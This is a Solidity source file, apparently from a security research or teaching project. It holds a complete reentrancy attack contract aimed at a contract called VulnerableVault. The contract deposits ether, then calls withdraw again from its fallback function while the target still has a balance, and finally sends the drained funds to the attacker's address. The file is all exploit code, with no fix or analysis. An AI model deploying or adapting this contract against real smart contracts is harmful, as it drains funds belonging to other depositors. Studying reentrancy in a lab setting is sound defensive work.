// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title ReentrancyAttack
/// @notice 针对 VulnerableVault 的重入攻击示例，仅用于安全研究
interface IReentrancyTarget {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract ReentrancyAttack {
    IReentrancyTarget public target;
    address public attacker;
    bool private attacking;

    constructor(address _target) {
        target = IReentrancyTarget(_target);
        attacker = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == attacker, "only attacker");
        require(msg.value > 0, "need ether");

        target.deposit{value: msg.value}();
        attacking = true;
        target.withdraw(msg.value);
        attacking = false;
    }

    receive() external payable {
        if (attacking && address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }

    function withdrawProfit() external {
        require(msg.sender == attacker, "only attacker");
        payable(attacker).transfer(address(this).balance);
    }
}

